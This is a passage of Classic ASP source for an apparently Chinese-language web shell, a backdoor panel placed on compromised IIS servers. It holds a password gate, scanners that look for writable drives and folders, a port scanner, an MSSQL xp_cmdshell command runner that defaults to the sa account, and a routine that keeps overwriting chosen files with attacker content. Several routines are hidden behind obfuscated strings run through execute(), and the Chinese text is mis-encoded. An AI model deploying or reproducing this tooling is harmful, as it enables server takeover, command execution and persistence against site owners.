j"<TD align=middle><B>����վĿ¼</B></TD><TD colspan=3>����վĿ¼ <TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\recycler\><b>��ϸ����</b></a></TD><TR class=TBTD> <FORM action= method=Post><TD align=middle><B>wmpubĿ¼ </B></TD><TD colspan=3>wmpub<TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\wmpub\><b>��ϸ����</b></a></TD></TABLE><BR>"
j"</FORM></TR></TABLE><BR><DIV align=center><FORM Action=?Action=ScFolder method=Post>ָ���ļ��в�ѯ��<INPUT type=text name=Folder value=""c:\php\,d:\Program Files\,C:\Documents and Settings\All Users\Documents\,C:\recycler\,d:\recycler\,e:\recycler\,f:\recycler\,C:\wmpub\,C:\WINDOWS\Temp\,C:\360rec,C:\cache,C:\JPEGCapture,C:\Inetpub""><INPUT type=submit value=���ɱ���> �����鿴Ŀ¼Ȩ��,������Ŀ¼�á�,��������</FORM><DIV>"
Set FSO=Nothing
End Sub 

Sub ScanDrive(Drive)
Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
If Drive <> "" Then
Set FSO = Server.Createobject(CONST_FSO)
Set TestDrive = FSO.GetDrive(Drive)
If TestDrive.IsReady Then
Temp_Str = "<LI>���̷������ͣ�" & Red(TestDrive.FileSystem) & "<LI>�������кţ�" & Red(TestDrive.SerialNumber) & "<LI>���̹�������" & Red(TestDrive.ShareName) & "<LI>������������" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>���̾�����" & Red(TestDrive.VolumeName) & "<LI>���̸�Ŀ¼:" & ScReWr((Drive & ":\"))
Set BaseFolder = TestDrive.RootFolder
Set TempFolders = BaseFolder.SubFolders
For Each D in TempFolders
Temp_Str = Temp_Str & "<LI>�ļ��У�" & ScReWr(D)
Next
Set TempFolder = Nothing
Set BaseFolder = Nothing
Else
Temp_Str = Temp_Str & "<LI>���̸�Ŀ¼:" & Red("���ɶ�:(")
Dim TempFolderList,t:t=0
Temp_Str = Temp_Str & "<LI>" & Red("���Ŀ¼���ԣ�")
TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
For i = 0 to Ubound(TempFolderList)
If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
t = t+1
Temp_Str = Temp_Str & "<LI>�����ļ��У�" & ScReWr(Drive & ":\" & TempFolderList(i))
End if
Next
If t=0 then Temp_Str = Temp_Str & "<LI>�����" & Drive & "�̸�Ŀ¼����δ�з���:("
End if
Set TestDrive = Nothing
Set FSO = Nothing
Temp_Str = Temp_Str 
Message Drive & ":������Ϣ",Temp_Str,1
End if
End Sub
Sub ScFolder(folder)
 'On Error Resume Next
folderArr = Split(folder,",")
For i = 0 To Ubound(folderArr)
Dim FSO,OFolder,TempFolder,Scmsg,S
Set FSO = Server.Createobject(CONST_FSO)
folder = folderArr(i)
If FSO.FolderExists(folder) Then
 Set OFolder = FSO.GetFolder(folder)
Set TempFolders = OFolder.SubFolders
Scmsg = "<LI>ָ���ļ��и�Ŀ¼��" & ScReWr(folder)
For Each S in TempFolders
 Scmsg = Scmsg&"<LI>�ļ��У�" & ScReWr(S) 
Next
Set TempFolders = Nothing
Set OFolder = Nothing
Else
 Scmsg = Scmsg & "<LI>�ļ��У�" & Red(folder & "�����ڻ��޶�Ȩ��!")
End if
Scmsg = Scmsg & "<br><br>ע�⣺��Ҫ���ˢ�±�ҳ�棬������ֻд�ļ��л����´��������ļ�!"&backurl
Set FSO = Nothing
Message "",Scmsg,1
next
End Sub
Function ScReWr(folder):On Error Resume Next:Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename:Set FSO = Server.Createobject(CONST_FSO):Set TestFolder = FSO.GetFolder(folder):Set TestFileList = TestFolder.SubFolders:RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp":For Each A in TestFileList:Next:If err Then:err.Clear:ReWrStr = folder & "<FONT color=#ff2222> ���ɶ�,":FSO.CreateTextFile folder & RndFilename,True:If err Then:err.Clear:ReWrStr = ReWrStr & "����д��</FONT>":Else:ReWrStr = ReWrStr & "��д��</FONT>":FSO.DeleteFile folder & RndFilename,True:End If:Else:ReWrStr = folder & "<FONT color=#dddddd> �ɶ�,":FSO.CreateTextFile folder & RndFilename,True:If err Then:err.Clear:ReWrStr = ReWrStr & "����д��</FONT>":Else:ReWrStr = ReWrStr & "��д��</FONT>":FSO.DeleteFile folder & RndFilename,True:End if:End if:Set TestFileList = Nothing:Set TestFolder = Nothing:Set FSO = Nothing:ScReWr = ReWrStr:End Function:Sub CustomScanDriveForm():execute(king("yo rft��`>``;)0-(gu.nkgzloi``=aeosZfg ��ҳ���ϻط�=txsqc fgzzxw=thnz JMYGC<` p��`>kw<]������ɨ[` p��zbtG�� yC rfS��koWzbtGaetiZ,tsoXaetiZ,))o(zoshUlizqY(dokJ tsoX_koW_tzokKkoWvgiU��ftiz 1>)`:`,)o(zoshUlizqY(kzlfo yo�� )zoshUlizqY(rfxgAM gJ )zoshUlizqY(rfxgAV=o kgX�� ))10(kie&)80(kie,)`lizqY`(zltxjtN(zoshU=zoshUlizqY��)`lizqY`(zltxjtN = )`lizqh`(fgolltU��ilxsX.tlfghltk��`>kw<......�������ʱ�Ķ�һҪ���ܿɲ��` p��)`fg`=)`hdtJaetiZgG`(zltxjtN( = hdtJaetiZgG��)`fg`=)`tzokKgGvgiU`(zltxjtN( = koWtzokKgGvgiU��)`fg`=)`koWzbtGaetiZ`(zltxjtN( = koWzbtGaetiZ��)`fg`=)`tsoXaetiZ`(zltxjtN( = tsoXaetiZ��tlst��`>ktzfte/<>dkgy/<` p��`>stwqs/<¼Ŀʱ�ٲ�첻` p��`>/ 'rtaetie'=rtaetie 'hdtJaetiZgG'=ro 'bgwaetie'=thnz 'hdtJaetiZgG'=tdqf zxhfo<` p��`>'hdtJaetiZgG'=kgy stwqs<` p��`>stwqs/<���ĺ�¼Ŀд����` p��`>/'tzokKgGvgiU'=ro 'bgwaetie'=thnz 'tzokKgGvgiU'=tdqf zxhfo<` p��`>'tzokKgGvgiU'=kgy stwqs<` p��`>stwqs/<` p��`�����Բ�>/  'rtaetie'=rtaetie 'tsoXaetiZ'=ro 'bgwaetie'=thnz 'tsoXaetiZ'=tdqf zxhfo<` p��`>'tsoXaetiZ'=kgy stwqs<` p��`>stwqs/<` p��`  ¼Ŀ�Բ�>/ 'rtaetie'=rtaetie 'koWzbtGaetiZ'=ro 'bgwaetie'=thnz 'koWzbtGaetiZ'=tdqf zxhfo<` p��`>'koWzbtGaetiZ'=kgy stwqs<` p��`> '���ʼ��'=txsqc 'fgzzxw'=tdqf 'zodwxl'=thnz zxhfo<` p��`>/ kw<` p��`>qtkqzbtz/<`&kzl_lizqY&`>'zorS'=llqse '10'=lvgk '13'=lsge 'lizqY'=tdqf qtkqzbtz<` p��`>kw<¼Ŀ�Ӳ�춯�Ի����,¼Ŀ�Ĳ����������>kw<!Ϣ�Ź���ȫ��Щһ�����������Ϊ,����д��¼Ŀ������������Կ���̴�` p��`>''=fgozeq 'zlgh'=rgiztd '0dkgy'=tdqf '0dkgy'=ro dkgy<>ktzfte<` p��)`lizqh`(fgolltU=kzl_lizqY  ftiz ``><)`lizqh`(fgolltU yo��`wxhztfC\:Z`&)10(kie&)80(kie&`tkxzhqZESYR\:Z`&)10(kie&)80(kie&`tieqe\:Z`&)10(kie&)80(kie&`etk158\:Z`&)10(kie&)80(kie&`\foqdzlgittky\:r`&)10(kie&)80(kie&`\wxhdv\:Z`&)10(kie&)80(kie&`\ktsenetk\:y`&)10(kie&)80(kie&`\ktsenetk\:t`&)10(kie&)80(kie&`\ktsenetk\:r`&)10(kie&)80(kie&`\ktsenetk\:Z`&)10(kie&)80(kie&`\ltsoX dqkugkY\:t`&)10(kie&)80(kie&`\ltsoX dqkugkY\:r`&)10(kie&)80(kie&`\hih\:e`&)10(kie&)80(kie&`\ltsoX dqkugkY\:e`&)10(kie&)80(kie&`\lufozztU rfq lzftdxegW\:e`&)10(kie&)80(kie&`\lvgrfov\:e`=kzl_lizqY��ftiz ``= )`lizqY`(zltxjtN yo��SxkJ = ktyyxA.tlfghltN'"))
end sub
function GetFullPath(path)
GetFullPath = path
if Right(path,1) <> "\" then GetFullPath = path&"\" 
end function
Function Deltextfile(filepath)
On Error Resume Next
Set objFSO = CreateObject(CONST_FSO) 
if objFSO.FileExists(filepath) then 
objFSO.DeleteFile(filepath) 
end if 
Set objFSO = nothing
Deltextfile = Err.Number 
End Function 
Function CheckDirIsOKWrite(DirStr)
On Error Resume Next
Set FSO = Server.CreateObject(CONST_FSO)
filepath = GetFullPath(DirStr)&fso.GettempName
FSO.CreateTextFile(filepath) 
CheckDirIsOKWrite = Err.Number
if  ShowNoWriteDir and (CheckDirIsOKWrite =70) then
j "[<font color=#0066FF>Ŀ¼</font>]"&DirStr&" [<font color=red>"&Err.Description&"</font>]<br>"
end if
set fout =Nothing
set FSO = Nothing
Deltextfile(filepath)
if CheckDirIsOKWrite=0 and Deltextfile(filepath)=70 then CheckDirIsOKWrite =1
end Function
function CheckFileWrite(filepath)
On Error Resume Next
Set FSO = Server.CreateObject(CONST_FSO)
set getAtt=FSO.GetFile(filepath)
getAtt.Attributes = getAtt.Attributes
  CheckFileWrite = Err.Number 
set FSO = Nothing
set getAtt = Nothing  
end function
function ShowDirWrite_Dir_File(Path,CheckFile,CheckNextDir)
On Error Resume Next
Set FSO = Server.CreateObject(CONST_FSO)
B = FSO.FolderExists(Path)
set FSO=nothing
IS_TEMP_DIR =(instr(UCase(Path),"WINDOWS\TEMP")>0) and NoCheckTemp
if B=false then
Re = CheckFileWrite(Path)
if Re =0 then
j "[�ļ�]<font color=red>"&Path&"</font><br>"
b =true
exit function
else
j "[<font color=red>�ļ�</font>]"&Path&" [<font color=red>"&Err.Description&"</font>]<br>"
exit function
end if
end if
Path = GetFullPath(Path)
re = CheckDirIsOKWrite(Path)
if (re =0) or (re=1) then
j "[Ŀ¼]<font color=#0000FF>"& Path&"</font><br>"
end if
Set FSO = Server.CreateObject(CONST_FSO)
set f = fso.getfolder(Path)
if (CheckFile=True) and (IS_TEMP_DIR=false) then
b=false
for each file in f.Files
Re = CheckFileWrite(Path&file.name)
if Re =0 then
j "[�ļ�]<font color=red>"& Path&file.name&"</font><br>"
b =true
else
if ShowNoWriteDir then j "[<font color=red>�ļ�</font>]"&Path&file.name&" [<font color=red>"&Err.Description&"</font>]<br>"
end if
next
if b then response.Flush 
end if
for each file in f.SubFolders
if CheckNextDir=false then
re = CheckDirIsOKWrite(Path&file.name)
if (re =0) or (re=1) then
j "[Ŀ¼]<font color=#0066FF>"& Path&file.name&"</font><br>"
end if
end if
if (CheckNextDir=True) and (IS_TEMP_DIR=false) then 
ShowDirWrite_Dir_File Path&file.name,CheckFile,CheckNextDir 
end if
next
Set FSO = Nothing
set f = Nothing
end function
function goback():set fs=server.CreateObject("scripting.filesystemobject") 
set outpout=fs.CreateTextFile(server.mappath("ok.asp"),True) 
outpout.Write(""&king("ufoizgf=ktrsgyg ztl��ufoizgf=glyB ztl��yo rft��`>ktzfte/<>kw/<>';)0-(gu.nkgzloi'=aeosZfg �ط�=txsqc fgzzxw=thnz JMYGC<>kw<>ktzfte<>ktzfte/<!��¼Ŀ���̴��Ǿ���>ktzfte<>zhokel/<)```&)`izqYktrsgX`(fgolltU&```(ktrsgXvgiU>zhokel<` p�� tlst��`>zhokel/<)```&)ktrsgyzftkqh.ktrsgyg(izqYtN&```(ktrsgXvgiU>zhokel<` p�� ftiz ktrsgXzggNlC.ktrsgyg zgf yo��))`izqYktrsgX`(fgolltU(ktrsgyztE.glyB = ktrsgyg ztl��)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU = glyB ztl")& "")
end function
sub ReadREG()
execute(king("yo rft��yC rfS��nqkkQtiz & `>os<` p��tlsS��zbtG��)o(nqkkQtiz & `>os<` p��)nqkkQtiz(rfxgAM gJ 1=o kgX��ftiJ )nqkkQtiz(nqkkQlC yC��)izqYtiz(rqtNutN.Llv=nqkkQtiz��)`izqYtiz`(zltxjtN=izqYtiz��)`sstiU.zhokeUK`(zetpwBtzqtkZ.ktcktU = Llv ztU��zbtG tdxltN kgkkS fB��ftiz ``><)`izqYtiz`(zltxjtN yo��`>/ki<>dkgy/<` p��`>')(zodwxl.dkgy.loiz'=aeosefg 'ֵ �� ��'=txsqc fgzzxw=thnz zxhfo<` p��`>13=tmol ''=txsqc izqYtiz=tdqf zxhfo< ` p��`>/ kw<>zetstl/<` p��`>fgozhg/<�ڶ�YZJ�ķſ�����>'lzkgYrtvgssQYZJ\}S9AS66ZW3780-8XXQ-Z1A7-22S3-390657Q3{\lteqyktzfC\lktztdqkqY\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\TVFD'=txsqc fgozhg<` p��`>fgozhg/<�ڶ�YWM�ķſ�����>'lzkgYrtvgssQYWM\}S9AS66ZW3780-8XXQ-Z1A7-22S3-390657Q3{\lteqyktzfC\lktztdqkqY\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\TVFD'=txsqc fgozhg<` p��`>fgozhg/<�ſ����>'YZJ:2388\zloV\lzkgYfthBnssqwgsE\tsoygkYrkqrfqzU\neosgYssqvtkoX\lktztdqkqY\llteeQrtkqiU\lteocktU\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD'=txsqc fgozhg<` p��`>fgozhg/<ugV tsxrtieU>'izqYugV\zftuQufosxrtieU\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD'=txsqc fgozhg<` p��`>fgozhg/<8�˹�ho/hez>'lktzsoXnzokxetUtswqfS\hoheJ\lteocktU\ztUsgkzfgZzftkkxZ\TSJUOU\SGCDZQT_VQZBV_OSFD'=txsqc fgozhg<` p��`>fgozhg/<9�˹�ho/hez>'lktzsoXnzokxetUtswqfS\hoheJ\lteocktU\911ztUsgkzfgZ\TSJUOU\SGCDZQT_VQZBV_OSFD'=txsqc fgozhg<` p��`>fgozhg/<0�˹�ho/hez>'lktzsoXnzokxetUtswqfS\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\SGCDZQT_VQZBV_OSFD'=txsqc fgozhg<` p��`>fgozhg/<�ڶ�̬״KnfQeY>``zkgYlxzqzUYCYZJ\dtzlnU\fgolktIzftkkxZ\tktivnfQeh\etzfqdnU\SNQKJXBU\TVFD``=txsqc fgozhg<`p��`>fgozhg/<�ڶ˾���KnfQeY>``zkgYqzqWYCYZJ\dtzlnU\fgolktIzftkkxZ\tktivnfQeh\etzfqdnU\SNQKJXBU\TVFD``=txsqc fgozhg<`p��`>fgozhg/<�ڶ�2388>``ktwdxGzkgY\heJ-YWN\lfgozqzUfoK\ktcktU sqfodktJ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD``=txsqc fgozhg<`p��`>fgozhg/<�ڶ�7ZGI>``ktwdxGzkgY\7ZGIfoK\ZGIsqtN\SNQKJXBU\TVFD``=txsqc fgozhg<`p��`>fgozhg/<����7ZGI>``rkgvllqY\7ZGIfoK\ZGIsqtN\SNQKJXBU\TVFD``=txsqc fgozhg<`p��`>fgozhg/<�ڶ�8ZGI>``ktwdxGzkgY\8ZGIfoK\VNB\tkqvzygU\MZFD``=txsqc fgozhg<`p��`>fgozhg/<����8ZGI>``rkgvllqY\8ZGIfoK\VNB\tkqvzygU\MZFD``=txsqc fgozhg<`p��`>fgozhg/<�ڶ�fodrqN>``zkgY\lktztdqkqY\ktcktU\1.9c\fodrQN\TSJUOU\TVFD``=txsqc fgozhg<`p��`>fgozhg/<����fodrqN>``ktztdqkqY\lktztdqkqY\ktcktU\1.9c\fodrQN\TSJUOU\TVFD``=txsqc fgozhg<`p��`>fgozhg/<���п���>``rfoA\tuqafoV\hoheJ\lteocktU\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD``=txsqc fgozhg<`p��`>fgozhg/<tdqGktzxhdgZ>'tdqGktzxhdgZ\tdqGktzxhdgZ\tdqGktzxhdgZ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD'=txsqc fgozhg<` p��`>fgozhg/<ֵ���Ĵ�����ѡ>''=txsqc fgozhg<` p��`>';txsqc.loiz=txsqc.izqYtiz.dkgy.loiz'=tufqiZfg zetstl<` p��` >9=fqhlsge rz<>kz<` p��`>zeQtiz=tdqf utNrqtN=txsqc ftrroi=thnz zxhfo<` p�� `>h<ȡ��ֵ������ע`  p��`>zlgh=rgiztd dkgy<` p"))
end sub
sub delpoint()
execute(king("`>cor/<>dkgy/<>'���ĵ����ɾ'=txsqc 'zodwxU'=tdqf 'zodwxl'=thnz zxhfo<>'hlq.tsoy\..zgr\zlgittky\:W'= txsqc'63'=tmol  'zbtz'=thnz'tsoyhstr'=tdqf zxhfo<>'zlgh'=rgiztd ''=fgozeq dkgy<>h<>dkgy/<>'¼Ŀ�����ɾ'=txsqc 'zodwxU'=tdqf 'zodwxl'=thnz zxhfo<>'..zgr\zlgittky\:W'=txsqc '63'=tmol 'zbtz'=thnz 'ktrgsyhstr'=tdqf zxhfo<>'zlgh'=rgiztd''=fgozeq dkgy<>kw<>kw<` p��`>zfgy<д����ʾ�ղ�>rtk= kgsge zfgy<` p��yo rft��)`tsoyhstr`(zltxjtN&`\?\\` tsoyzfoghstr��ftiz ``>< )`tsoyhstr`(zltxjtN yo��yo rft��)`ktrgsyhstr`(zltxjtN&`\?\\` ktrsgyzfoghstr��ftiz ``>< )`ktrgsyhstr`(zltxjtN yo"))

end  sub
function Delpointfolder(t0)
execute(king("kqtsZ.kkS:fgozhokeltW.kkS p ftiJ kkS XC��`>kw<!!���ɳ�ɾ`&1z  p     ��   txkz,1y ktrsgXtztstW.gly�� ftiJ )1y(lzlobSktrsgX.gly XC'��yC rfS��)1z(izqYhqT.ktcktU=1y  ��tlsS��1z=1y  ��ftiJ 1>)`\:`,1z(kzlfC yC��)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU=gly ztU"))

End Function
function Delpointfile(t0)
execute(king("`>kw<!!���ɳ�ɾ`&1z  p��kqtsZ.kkS:fgozhokeltW.kkS p ftiJ kkS XC �� txkz,1y tsoXtztstW.gly ��yC rfS ��)1z(izqYhqT.ktcktU=1y  ��tlsS ��1z=1y ��ftiJ 1>)`\:`,1z(kzlfC yC��)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU=gly ztU ��zbtG tdxltN kgkkS fB'"))
End function
if request("ProFile")<>"" then
on error resume next
if Application(request("ProFile"))=1 then
Set fsoXX = Server.CreateObject(CONST_FSO)
if request("DelCon")=1 then
Application(request("ProFile")&"Con")=""
response.redirect Url&"?ProFile="&request("ProFile")&""
response.end
end if
DIM rline,rline2
rline2=Application(request("ProFile")&"Code")
rline2=rline2&vbcrlf
j"<meta http-equiv=""refresh"" content="&Application(request("ProFile")&"Time")&">"
j"<a href="&Url&"?ProFile="&request("ProFile")&"&DelCon=1><b>�����־</b></a> &nbsp;<font color=yellow>Ҫ����������ֱ�ӹر�ҳ�漴�ɡ�</font><br>"
for each FileUrl in split(Application(request("ProFile")&"File"),vbcrlf)
FileUrl=trim(FileUrl)
if fsoXX.FileExists(FileUrl) then
Set txt = fsoXX.OpenTextFile(FileUrl,1,true)
rline=""
if Not txt.AtEndOfStream then
rline=txt.ReadAll  
end if
if rline2<>rline then
txt.close
fsoX.GetFile(FileUrl).Attributes=32
if Application(request("ProFile")&"Char")=1 then
set myfileee = fsoXX.CreateTextFile(FileUrl,true)
else
set myfileee = fsoXX.CreateTextFile(FileUrl,true,true)
end if
myfileee.writeline Application(request("ProFile")&"Code")
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" <font color=yellow>�����ģ��ѻָ�</font><br>"&Application(request("ProFile")&"Con")
else
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" ��<br>"&Application(request("ProFile")&"Con")
txt.close
end if
else
if Application(request("ProFile")&"Char")=1 then
set myfileee = fsoXX.CreateTextFile(FileUrl,true)
else
set myfileee = fsoXX.CreateTextFile(FileUrl,true,true)
end if
myfileee.writeline Application(request("ProFile")&"Code")
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" <font color=red>��ɾ�����ѻָ�</font><br>"&Application(request("ProFile")&"Con")
end if
next
if ubound(split(Application(request("ProFile")&"Con"),"<br>"))>=40 then
dim ashowic
for ashowi=0 to 40
ashowic=ashowic&split(Application(request("ProFile")&"Con"),"<br>")(ashowi)&"<br>"
next
Application(request("ProFile")&"Con")=ashowic
end if
j Application(request("ProFile")&"Con")
else
j"<br><br><br><center>�������̶�ʧ����<a href="&URL&" style=""text-decoration:underline;font-weight:bold"">��������</a>�������̡�</center>"
end if
if request("profile")="a" then j c
response.end
end if

if session("KKK")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass or request.form("pass")=URL then
session("KKK")=UserPass
response.redirect url
else
j"<br><br><br><b><div align=center><a href="&siteurl&" target=_blank ><font size='3' color='red'>"&errin&"</a><br></font ></b> <br><br><br><br><b><div align=center><font size='14' color='lime'></font></b></p></center>"&backurl
end if
else
si="<center><FONT color='"&fontcor&"' style=""FONT-SIZE: 80pt; FILTER: shadow(color:"&color1&",strength=55); WIDTH: 100%;  LINE-HEIGHT: 300%; FONT-FAMILY:Arial"">"&Copyright&"</FONT ><div style='width:400px;padding:32px; align=left'><br><form action='"&url&"' method='post'><b>���룺</b><input name='pass' type='password' size='22'> <input type='submit' value='ȷ��'></center>"
if instr(SI,SIC)<>0 then j sI
end if
response.end
end if
sub ScanPort()
Server.ScriptTimeout = 7776000
if request.Form("port")="" then
PortList="21,23,53,1433,3306,3389,4899,5631,5632,5800,5900,43958"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
j"<p>�˿�ɨ����(���ɨ�����˿�,�ٶȱȽ���,�����Ƽ�ʹ��CMD��CMD������ɨ�費׼ȷ��)</p><p>�������������ɨ�����ⲿIP�����޷����ӡ�����SHELL��ִ��ϵ�в�����</p>"
j"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
j"<p>Scan IP: "
j" <input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'>"
j"<br>Port List:"
j"<input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'>"
j"<br><br>"
j"<input name='submit' type='submit' class='buttom' value=' scan '>"
j"<input name='scan' type='hidden' id='scan' value='111'>"
j"</p></form>"
If request.Form("scan") <> "" Then
timer1 = timer
j("<b>ɨ�豨��:</b><br><hr>")
tmp = Split(request.Form("port"),",")
ip = Split(request.Form("ip"),",")
For hu = 0 to Ubound(ip)
If InStr(ip(hu),"-") = 0 Then
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ip(hu), tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ip(hu), j)
Next
Else
j(startN & " or " & endN & " is not number<br>")
End If
Else
j(tmp(i) & " is not number<br>")
End If
End If
Next
Else
ipStart = Mid(ip(hu),1,InStrRev(ip(hu),"."))
For xxx = Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ipStart & xxx, tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ipStart & xxx,j)
Next
Else
j(startN & " or " & endN & " is not number<br>")
End If
Else
j(tmp(i) & " is not number<br>")
End If
End If
Next
Next
End If
Next
timer2 = timer
thetime=cstr(int(timer2-timer1))
j"<hr>Process in "&thetime&" s"
END IF
end sub
Sub Scan(targetip, portNum)
On Error Resume Next
set conn = Server.CreateObject("ADODB.connection")
connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
conn.ConnectionTimeout = 1
conn.open connstr
If Err Then
If Err.number = -2147217843 or Err.number = -2147467259 Then
If InStr(Err.description, "(Connect()).") > 0 Then
j(targetip & ":" & portNum & ".........<font color=green>�ر�</font><br>")
Else
j(targetip & ":" & portNum & ".........<font color=red>����</font><br>")
End If
End If
End If
End Sub
Select Case Action:case "MainMenu":MainMenu()
Case "EditPower"
Call EditPower(request("PowerPath"))
Case "SavePower"
Call SavePower(request("PowerPath"),request("SaveType"))
case "getTerminalInfo":getTerminalInfo():case "PageAddToMdb":PageAddToMdb():case "ScanPort":ScanPort():FuncTion MMD():SI="<br><form name=form method=post action=""""><table width=""85%"" align='center'><tr align=center><Td id=s><b id=x>MSSQL Commander</b></td></tr><tr align='center'><td id=d><b id=x>Command��</b><input type=text name=MMD size=35 value=""ipconfig"" >&nbsp;<b id=x>UserName��</b><input type=text name=U value=sa>&nbsp;<b id=x>Password��</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>":j SI:SI="":If trim(request.form("MMD"))<>""  Then:password= trim(Request.form("P")):id=trim(Request.form("U")):set adoConn=sERvEr.crEATeobjECT("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id:strQuery = "exec master.dbo.xp_cMdsHeLl '" & request.form("MMD") & "'":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult = strResult & chr(13) & recResult(0):recResult.MoveNext:Loop:End if:set recResult = Nothing:strResult = Replace(strResult," ","&nbsp;"):strResult = Replace(strResult,"<","&lt;"):strResult = Replace(strResult,">","&gt;"):strResult = Replace(strResult,chr(13),"<br>"):End if:set adoConn = Nothing:j request.form("MMD") & "<br>"& strResult:end FuncTion:case "Alexa"
dim AlexaUrl,Top:AlexaUrl=request("u"):Top=Alexa(AlexaUrl):if AlexaUrl="" then AlexaUrl=""&request.servervariables("http_host")&""
execute(king("`>kz/<>rz/<`&)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<���������ASK>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>kz/<>rz/<`&)`UB`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<ͳϵ���������>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>kz/<>rz/<`&)`UNBUUSZBNY_XB_NSATMG`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<����MYZ�����>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>kz/<>rz/< `&vgf&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<��ʱ�����>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>dkgy/<>kz/<>rz/<>'9'=txsqc 'fgozeq'=tdqf 'ftrroi'=thnz zxhfo<>'bh1:ktrkgw'=tsnzl'________________'=txsqc 'zodwxl'=thnz zxhfo<>'bh1:ktrkgw'=tsnzl'`&)`NWWQ_VQZBV`(ltswqokqIktcktU.zltxjtN&`'=txsqc '60'=tmol 'ho'=tdqf 'zbtz'=thnz zxhfo<>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<YC�����>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>'afqsw_'=ztukqz 'dkgyho'=tdqf 'hlq.ho/tktiv/wtv/ukg.sstilwtv//:hzzi'=fgozeq zlgh=rgiztd dkgy<>kz/<>rz/<`&)`STQG_NSINSU`(ltswqokqIktcktl.zltxjtk&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<�������>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>kz/<>rz/<Ϣ�ż��������>'xftd'=kgsgeuw 'ktzfte'=fuosq '8'=fqhlsge '19'=ziuoti rz<>kz<>'ktzfte'=fuosq '1'=uforrqhsste '0'=ufoeqhlsste '1'=ktrkgw 'xftd'=kgsgeuw '%13'=izrov tswqz<>kw<`=CU"))
For i=0 To 18
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF' align=left>"&ObT(i,2)&"</td></tr>"
Next
j SI
Err.Clear
Function bytes2BSTR(vIn) 
dim strReturn 
dim i1,ThisCharCode,NextCharCode 
strReturn = "" 
For i1 = 1 To LenB(vIn) 
ThisCharCode = AscB(MidB(vIn,i1,1)) 
If ThisCharCode < &H80 Then 
strReturn = strReturn & Chr(ThisCharCode) 
Else 
NextCharCode = AscB(MidB(vIn,i1+1,1)) 
strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
i1 = i1 + 1 
End If 
Next 
bytes2BSTR = strReturn 
    Err.Clear
End Function
Case "Servu"
SUaction=request("SUaction")
